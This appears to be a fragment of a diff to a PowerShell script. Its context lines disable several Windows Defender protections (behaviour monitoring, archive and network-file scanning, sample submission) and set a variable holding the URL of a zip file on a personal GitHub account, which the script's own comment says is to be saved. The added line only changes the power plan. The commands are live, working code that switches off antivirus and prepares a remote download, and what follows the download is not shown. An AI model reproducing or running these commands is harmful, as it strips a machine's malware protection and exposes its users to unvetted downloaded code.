@@ -13,6 +13,7 @@ Set-MpPreference -DisableBehaviorMonitoring $true
 Set-MpPreference -DisableArchiveScanning $true
 Set-MpPreference -DisableScanningNetworkFiles $true
 Set-MpPreference -SubmitSamplesConsent 2
+powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61
 $zipUrl = "https://raw.githubusercontent.com/user009dm/new/main/sordum.zip"
 
 # Define the path where the ZIP file will be saved
